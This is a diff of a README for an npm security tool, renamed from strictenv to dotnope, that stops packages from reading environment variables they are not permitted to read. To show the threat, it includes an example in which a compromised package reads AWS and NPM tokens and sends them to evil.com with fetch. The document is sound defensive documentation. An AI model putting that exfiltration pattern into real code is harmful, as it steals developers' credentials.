@@ -1,4 +1,4 @@
-# strictenv
+# dotnope
 
 Stop npm packages from stealing your secrets.
 
@@ -8,17 +8,17 @@ The [Shai-Hulud worm](https://www.cisa.gov/news-events/alerts/2025/09/23/widespr
 
 **Any package in your node_modules can read any environment variable. There's no permission system.**
 
-strictenv fixes this.
+dotnope fixes this.
 
 ## Quickstart
 
 ```bash
-npm install strictenv
+npm install dotnope
 ```
 
 ```javascript
 // At the very top of your entry point
-require('strictenv').enableStrictEnv();
+require('dotnope').enableStrictEnv();
 ```
 
 ```json5
@@ -40,7 +40,7 @@ require('strictenv').enableStrictEnv();
 When a non-whitelisted package tries to read an env var:
 
 ```
-strictenv: Unauthorized environment variable access!
+dotnope: Unauthorized environment variable access!
 
   Package: "totally-legit-package"
   Attempted to read: "AWS_SECRET_ACCESS_KEY"
@@ -66,10 +66,10 @@ const npm = process.env.NPM_TOKEN;              // No restrictions!
 fetch('https://evil.com/steal', { body: JSON.stringify({ aws, npm }) });
 ```
 
-With strictenv enabled, that code throws immediately:
+With dotnope enabled, that code throws immediately:
 
 ```
-ERR_STRICTENV_UNAUTHORIZED: "compromised-pkg" cannot read "AWS_SECRET_ACCESS_KEY"
+ERR_DOTNOPE_UNAUTHORIZED: "compromised-pkg" cannot read "AWS_SECRET_ACCESS_KEY"
 ```
 
 The malware never gets your credentials. Your app crashes loudly instead of silently leaking secrets.
